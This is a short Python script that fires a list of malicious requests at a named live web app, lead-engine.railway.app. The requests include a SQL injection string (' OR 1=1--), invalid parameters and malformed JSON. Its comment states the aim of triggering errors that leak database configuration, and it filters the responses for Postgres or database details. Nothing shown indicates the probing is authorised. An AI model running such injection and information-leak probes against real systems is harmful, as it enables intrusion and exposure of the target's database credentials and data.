import urllib.request, urllib.error, json

# Try to trigger errors that might leak DB config
payloads = [
    # Try SQL injection on an existing endpoint
    ("/api/contacts?q=' OR 1=1--", "GET", None),
    # Try invalid page parameter
    ("/api/contacts?page=-1", "GET", None),
    # Try export with invalid format
    ("/export/sql", "GET", None),
    # Try malformed POST to merge endpoint (404 but worth a try)
    ("/api/merge-local", "POST", b"{{invalid json}}"),
    # Try direct-scrape with bad params
    ("/api/trigger/direct-scrape?source=TEST", "POST", None),
]

for path, method, data in payloads:
    try:
        url = f"https://lead-engine.railway.app{path}"
        req = urllib.request.Request(url, method=method)
        if data:
            req.data = data
            req.add_header("Content-Type", "application/json")
        resp = urllib.request.urlopen(req, timeout=10)
        body = resp.read().decode("utf-8", errors="replace")[:500]
        print(f"{method} {url} -> {resp.status}")
        if resp.status == 200:
            print(f"  Body: {body[:200]}")
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")[:300]
        if e.code != 404 or "postgres" in body.lower() or "database" in body.lower():
            print(f"{method} {url} -> {e.code}: {body[:200]}")
    except Exception as e:
        print(f"{method} {url} -> {e}")
